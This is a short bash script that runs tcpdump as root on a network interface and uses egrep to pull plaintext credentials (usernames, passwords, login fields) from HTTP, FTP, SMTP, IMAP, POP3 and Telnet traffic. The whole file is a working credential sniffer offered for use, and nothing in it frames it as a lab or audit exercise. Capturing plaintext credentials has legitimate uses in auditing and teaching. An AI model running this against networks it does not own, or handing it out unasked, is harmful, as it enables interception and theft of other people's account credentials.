#!/usr/bin/env bash
#
# Author:       Riccardo Mollo (riccardomollo84@gmail.com)
#
# Name:	        tcpdump_sniff_passwords.sh
#
# Description:  A script that sniffs the traffic on your machine looking for
#               plaintext credentials (HTTP, FTP, SMTP, IMAP, POP3, TELNET).
#
# Usage:        ./tcpdump_sniff_passwords.sh
#
#
# --TODO--
# - ???
#
#
################################################################################


# VARIABLES --------------------------------------------------------------------

NIC="eth0"


# FUNCTIONS --------------------------------------------------------------------

command_exists() {
    command -v "$1" >/dev/null 2>&1 || { echo "Command not found: $1" 1>&2 ; exit 1 ; }
}


# CHECKS -----------------------------------------------------------------------

if [[ $EUID -ne 0 ]] ; then
    echo "This script must be run as root!" 1>&2

    exit 1
fi

declare -a CMDS=(
"egrep"
"tcpdump"
);

for CMD in ${CMDS[@]} ; do
    command_exists $CMD
done


# MAIN -------------------------------------------------------------------------

tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA -i "${NIC}" | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '

